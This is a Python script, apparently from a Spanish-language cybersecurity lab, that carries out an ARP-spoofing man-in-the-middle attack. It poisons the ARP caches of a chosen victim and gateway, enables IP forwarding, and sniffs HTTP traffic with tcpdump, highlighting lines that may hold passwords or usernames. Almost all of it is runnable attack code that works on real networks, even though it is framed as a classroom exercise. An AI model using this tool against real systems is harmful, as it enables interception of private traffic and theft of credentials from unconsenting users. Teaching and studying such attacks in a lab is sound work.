#!/usr/bin/env python3
"""
Equipo 3: Atacante (ARP Spoofing MitM)
Laboratorio de Ciberseguridad
"""

import argparse
import subprocess
import sys
import time
import re
import signal
from datetime import datetime
import threading
import os

class ARPAttacker:
    def __init__(self, interface, target_ip, gateway_ip):
        """
        Inicializa el atacante ARP
        
        Args:
            interface: Interfaz de red (ej: eth0, wlan0)
            target_ip: IP de la víctima (Equipo 1)
            gateway_ip: IP del servidor/destino (Equipo 2)
        """
        self.interface = interface
        self.target_ip = target_ip
        self.gateway_ip = gateway_ip
        self.running = False
        self.processes = []
        
    def enable_ip_forwarding(self):
        """Habilita el reenvío de IP en el sistema"""
        print("[*] Habilitando IP forwarding...")
        try:
            subprocess.run(["sudo", "sysctl", "-w", "net.ipv4.ip_forward=1"], 
                         check=True, capture_output=True)
            print("[✓] IP forwarding habilitado correctamente")
            return True
        except subprocess.CalledProcessError as e:
            print(f"[✗] Error al habilitar IP forwarding: {e}")
            return False
    
    def get_mac_address(self, ip):
        """Obtiene la dirección MAC de una IP"""
        try:
            result = subprocess.run(["arping", "-c", "1", "-I", self.interface, ip],
                                  capture_output=True, text=True, timeout=5)
            # Buscar MAC en la salida
            mac_match = re.search(r'\[([0-9a-f:]{17})\]', result.stdout)
            if mac_match:
                return mac_match.group(1)
        except:
            pass
        return None
    
    def start_arpspoof(self):
        """Inicia el envenenamiento ARP en ambas direcciones"""
        
        print("\n[*] Iniciando ataques ARP Spoofing...")
        print(f"[*] Víctima: {self.target_ip}")
        print(f"[*] Gateway: {self.gateway_ip}")
        print(f"[*] Interfaz: {self.interface}")
        
        # Comando 1: Engañar a la víctima para que piense que somos el gateway
        cmd1 = ["sudo", "arpspoof", "-i", self.interface, 
                "-t", self.target_ip, self.gateway_ip]
        
        # Comando 2: Engañar al gateway para que piense que somos la víctima
        cmd2 = ["sudo", "arpspoof", "-i", self.interface,
                "-t", self.gateway_ip, self.target_ip]
        
        try:
            # Iniciar ambos procesos
            proc1 = subprocess.Popen(cmd1, stdout=subprocess.DEVNULL, 
                                    stderr=subprocess.DEVNULL)
            proc2 = subprocess.Popen(cmd2, stdout=subprocess.DEVNULL,
                                    stderr=subprocess.DEVNULL)
            
            self.processes = [proc1, proc2]
            print("[✓] ARP Spoofing iniciado exitosamente")
            return True
            
        except FileNotFoundError:
            print("[✗] Error: 'arpspoof' no encontrado. Instala dsniff:")
            print("    sudo apt-get install dsniff")
            return False
        except Exception as e:
            print(f"[✗] Error al iniciar arpspoof: {e}")
            return False
    
    def start_tcpdump_monitoring(self):
        """Inicia monitoreo de tráfico HTTP con tcpdump"""
        print(f"\n[*] Iniciando monitoreo de tráfico HTTP en puerto 80...")
        print("[*] Presiona Ctrl+C para detener el ataque\n")
        print("=" * 80)
        
        cmd = ["sudo", "tcpdump", "-i", self.interface, "-A", "port 80", "-l"]
        
        try:
            process = subprocess.Popen(cmd, stdout=subprocess.PIPE,
                                      stderr=subprocess.DEVNULL,
                                      text=True, bufsize=1)
            
            # Procesar la salida en tiempo real
            for line in process.stdout:
                if line.strip():
                    timestamp = datetime.now().strftime("%H:%M:%S.%f")[:-3]
                    if "GET" in line or "POST" in line or "Host:" in line:
                        print(f"[{timestamp}] 📡 {line.strip()}")
                    elif "200 OK" in line or "404" in line:
                        print(f"[{timestamp}] ✅ {line.strip()}")
                    elif "password" in line.lower() or "user" in line.lower():
                        print(f"[{timestamp}] 🔑 ¡POSIBLE CREDENCIAL! {line.strip()}")
                    else:
                        if line.strip() and len(line.strip()) > 10:
                            print(f"[{timestamp}] 📄 {line.strip()[:200]}")
                            
        except KeyboardInterrupt:
            pass
        except Exception as e:
            print(f"[✗] Error en monitoreo: {e}")
    
    def start_wireshark_if_available(self):
        """Intenta iniciar Wireshark como alternativa"""
        try:
            subprocess.run(["which", "wireshark"], capture_output=True, check=True)
            print("\n[*] Wireshark detectado. ¿Deseas iniciarlo? (y/n): ", end="")
            choice = input().lower()
            if choice == 'y':
                subprocess.Popen(["sudo", "wireshark", "-i", self.interface, 
                                "-f", "port 80"])
                return True
        except:
            pass
        return False
    
    def show_statistics(self):
        """Muestra estadísticas del ataque"""
        print("\n" + "=" * 80)
        print("[*] ESTADÍSTICAS DEL ATAQUE")
        print("=" * 80)
        print(f"[*] Duración del ataque: Activo")
        print(f"[*] Víctima: {self.target_ip}")
        print(f"[*] Gateway: {self.gateway_ip}")
        print(f"[*] Interfaz: {self.interface}")
        
        # Mostrar tabla ARP modificada
        print("\n[*] Tabla ARP actual (envenenada):")
        try:
            subprocess.run(["arp", "-a"], check=False)
        except:
            pass
    
    def cleanup(self):
        """Limpia los procesos y restaura el sistema"""
        print("\n\n[*] Limpiando y restaurando...")
        
        # Terminar procesos de arpspoof
        for proc in self.processes:
            if proc and proc.poll() is None:
                proc.terminate()
                time.sleep(0.5)
                if proc.poll() is None:
                    proc.kill()
        
        # Deshabilitar IP forwarding
        try:
            subprocess.run(["sudo", "sysctl", "-w", "net.ipv4.ip_forward=0"],
                         capture_output=True, check=False)
        except:
            pass
        
        # Limpiar tabla ARP (opcional)
        print("[*] ¿Deseas limpiar la tabla ARP? (y/n): ", end="")
        choice = input().lower()
        if choice == 'y':
            try:
                subprocess.run(["sudo", "ip", "-s", "-s", "neigh", "flush", "all"],
                             capture_output=True, check=False)
                print("[✓] Tabla ARP limpiada")
            except:
                pass
        
        print("[✓] Limpieza completada")
    
    def run(self):
        """Ejecuta el ataque completo"""
        print("\n" + "=" * 80)
        print("🥷 EQUIPO 3 - ARP SPOOFING ATTACKER 🥷")
        print("=" * 80)
        
        # Verificar permisos
        if os.geteuid() != 0:
            print("[✗] Este script requiere permisos de root (sudo)")
            sys.exit(1)
        
        # Habilitar IP forwarding
        if not self.enable_ip_forwarding():
            sys.exit(1)
        
        # Mostrar información de red
        print(f"\n[*] Configuración actual:")
        subprocess.run(["ip", "addr", "show", self.interface], check=False)
        
        # Iniciar ataque ARP
        if not self.start_arpspoof():
            self.cleanup()
            sys.exit(1)
        
        # Preguntar método de monitoreo
        print("\n[*] Selecciona método de monitoreo:")
        print("    1. tcpdump (terminal)")
        print("    2. Wireshark (GUI - si está instalado)")
        print("    3. Ambos")
        
        choice = input("Opción (1-3): ").strip()
        
        # Configurar manejador de señal
        def signal_handler(sig, frame):
            self.running = False
            self.cleanup()
            sys.exit(0)
        
        signal.signal(signal.SIGINT, signal_handler)
        
        try:
            if choice == '1':
                self.start_tcpdump_monitoring()
            elif choice == '2':
                if not self.start_wireshark_if_available():
                    print("[*] Usando tcpdump como fallback")
                    self.start_tcpdump_monitoring()
            elif choice == '3':
                self.start_wireshark_if_available()
                self.start_tcpdump_monitoring()
            else:
                self.start_tcpdump_monitoring()
                
        except KeyboardInterrupt:
            pass
        finally:
            self.cleanup()

def get_network_info():
    """Obtiene información de red del sistema"""
    print("\n[*] Detectando interfaces de red disponibles:")
    try:
        result = subprocess.run(["ip", "link", "show"], 
                              capture_output=True, text=True)
        interfaces = re.findall(r'\d+: (\w+):', result.stdout)
        for i, iface in enumerate(interfaces, 1):
            if iface != "lo":
                print(f"    {i}. {iface}")
        return interfaces
    except:
        return []

def validate_ip(ip):
    """Valida formato de IP"""
    pattern = r'^(\d{1,3}\.){3}\d{1,3}$'
    if re.match(pattern, ip):
        parts = ip.split('.')
        return all(0 <= int(part) <= 255 for part in parts)
    return False

def main():
    parser = argparse.ArgumentParser(
        description="Equipo 3 - ARP Spoofing Man-in-the-Middle Attack",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Ejemplos de uso:
  %(prog)s -i eth0 -t 192.168.1.100 -g 192.168.1.1
  %(prog)s --interface wlan0 --target 192.168.1.50 --gateway 192.168.1.254
        """
    )
    
    parser.add_argument("-i", "--interface", help="Interfaz de red (ej: eth0, wlan0)")
    parser.add_argument("-t", "--target", help="IP del objetivo/cliente (Equipo 1)")
    parser.add_argument("-g", "--gateway", help="IP del gateway/servidor (Equipo 2)")
    parser.add_argument("--interactive", action="store_true", 
                       help="Modo interactivo para ingresar datos")
    
    args = parser.parse_args()
    
    # Modo interactivo o por argumentos
    if args.interactive or not (args.interface and args.target and args.gateway):
        print("\n=== Configuración Interactiva del Atacante ===")
        
        # Seleccionar interfaz
        interfaces = get_network_info()
        if interfaces:
            print("\n[*] Interfaz recomendada: " + interfaces[0] if interfaces else "?")
        interface = input("Interfaz de red (ej: eth0): ").strip()
        
        # Ingresar IP del cliente (víctima)
        while True:
            target = input("IP del Cliente (Equipo 1 - Víctima): ").strip()
            if validate_ip(target):
                break
            print("[!] IP inválida. Intenta nuevamente.")
        
        # Ingresar IP del servidor (gateway)
        while True:
            gateway = input("IP del Servidor (Equipo 2 - Destino): ").strip()
            if validate_ip(gateway):
                break
            print("[!] IP inválida. Intenta nuevamente.")
    else:
        interface = args.interface
        target = args.target
        gateway = args.gateway
        
        # Validar IPs
        if not validate_ip(target):
            print(f"[✗] IP de objetivo inválida: {target}")
            sys.exit(1)
        if not validate_ip(gateway):
            print(f"[✗] IP de gateway inválida: {gateway}")
            sys.exit(1)
    
    # Ejecutar ataque
    attacker = ARPAttacker(interface, target, gateway)
    attacker.run()

if __name__ == "__main__":
    main()